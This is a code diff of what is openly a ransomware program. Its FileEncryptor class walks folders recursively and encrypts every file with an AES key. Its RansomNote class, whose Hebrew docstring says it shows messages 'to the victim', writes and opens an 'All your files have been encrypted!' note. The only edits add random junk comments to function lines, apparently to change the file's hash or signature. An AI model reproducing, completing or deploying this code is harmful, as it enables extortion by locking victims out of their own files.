@@ -28,7 +28,7 @@ class FileEncryptor:
     """אחראי על הצפנה ופענוח של קבצים"""
 
     @staticmethod
-    def encrypt_all(folder_path, aes_key):
+    def encrypt_all(folder_path, aes_key):  #asdasdasdsasad
         for file_name in os.listdir(folder_path):
             full_path = os.path.join(folder_path, file_name)
             if os.path.isfile(full_path):
@@ -50,7 +50,7 @@ class FileEncryptor:
                 FileEncryptor.encrypt_all(full_path, aes_key)
 
     @staticmethod
-    def decrypt_all(folder_path, aes_key):
+    def decrypt_all(folder_path, aes_key): #213213213swdasdas
         for file_name in os.listdir(folder_path):
             full_path = os.path.join(folder_path, file_name)
             if os.path.isfile(full_path):
@@ -78,7 +78,7 @@ class RansomNote:
     """אחראי על הצגת הודעות לקורבן"""
 
     @staticmethod
-    def show_encrypted():
+    def show_encrypted(): #sadjasfgahsjsag
         note = """
         🔒 All your files have been encrypted!
         
@@ -91,7 +91,7 @@ class RansomNote:
         os.system("notepad README_DECRYPT.txt")
 
     @staticmethod
-    def show_decrypted():
+    def show_decrypted():#ashdsajgfsakg
         note = """
         🔓 All your files have been decrypted!
         Your system is restored and your files are back to normal.
